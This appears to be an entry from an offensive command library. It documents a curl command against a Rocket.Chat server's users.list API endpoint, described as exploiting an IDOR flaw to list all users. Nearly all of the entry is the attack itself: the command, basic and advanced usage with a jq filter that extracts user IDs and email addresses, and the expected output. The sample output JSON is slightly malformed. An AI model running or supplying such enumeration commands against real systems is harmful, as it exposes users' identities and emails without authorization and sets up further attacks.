---
id: c1d2e3f4-g5h6-7891-cdef-567890123456
data: >-
  curl -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $USER_ID"
  https://target/api/v1/users.list
tags:
  - api
  - enumeration
type: command
output: 'JSON array of users with _id, email, etc.'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:24.540Z'
verified: false
validated: true
submitted: true
---
# curl-users-list

## Command

```bash
curl -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $USER_ID" https://target/api/v1/users.list
```

## Description

Retrieves the list of all users from Rocket.Chat API, exploiting IDOR to access beyond authorized scope.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-Auth-Token: $TOKEN"` | Authentication token from login | Yes |
| `-H "X-User-Id: $USER_ID"` | User's ID from login | Yes |
| `https://target/api/v1/users.list` | Endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" https://rocketchat.example.com/api/v1/users.list
```

### Advanced Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" -s https://target/api/v1/users.list | jq '.users[] | {id: ._id, email: .emails[0].address}'
```

## Expected Output

JSON: {"users": [{="_id": "target123", "emails": [{"address": "target@example.com"}], ...}]}

## Related

- [[commands/curl-users-info]]
